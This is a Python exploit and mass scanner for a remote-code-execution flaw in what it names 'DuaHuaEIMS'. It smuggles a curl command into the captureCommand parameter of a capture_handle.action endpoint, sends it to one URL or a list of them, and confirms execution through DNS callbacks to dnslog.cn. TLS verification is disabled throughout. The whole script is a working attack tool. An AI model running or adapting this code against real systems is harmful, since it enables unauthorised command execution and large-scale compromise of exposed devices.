import requests
import urllib3
import re,string,random
from urllib.parse import urljoin
import argparse
import time
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def check(url):
    url = url.rstrip("/")
    try:
        headers = {
            "User-Agent": "Mozilla/2.0 (compatible; MSIE 3.01; Windows 95",
        }
        getdomain = requests.get(url='http://dnslog.cn/getdomain.php', headers={"Cookie": "PHPSESSID=hb0p9iqh804esb5khaulm8ptp2"}, timeout=30)
        domain = str(getdomain.text)
        target = urljoin(url, "/config/asst/system_setPassWordValidate.action/capture_handle.action?captureFlag=true&captureCommand=curl%20999.{}%20index.pcap".format(domain))
        requests.get(target, verify=False, headers=headers, timeout=30)
        for i in range(0, 3):
            refresh = requests.get(url='http://dnslog.cn/getrecords.php', headers={"Cookie": "PHPSESSID=hb0p9iqh804esb5khaulm8ptp2"}, timeout=30)
            time.sleep(1)
            if domain in refresh.text:
                print(f"\033[31mDiscovered:{url}: DuaHuaEIMS_capture_handle_RCE!\033[0m")
                return True
    except Exception as e:
        print(e)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")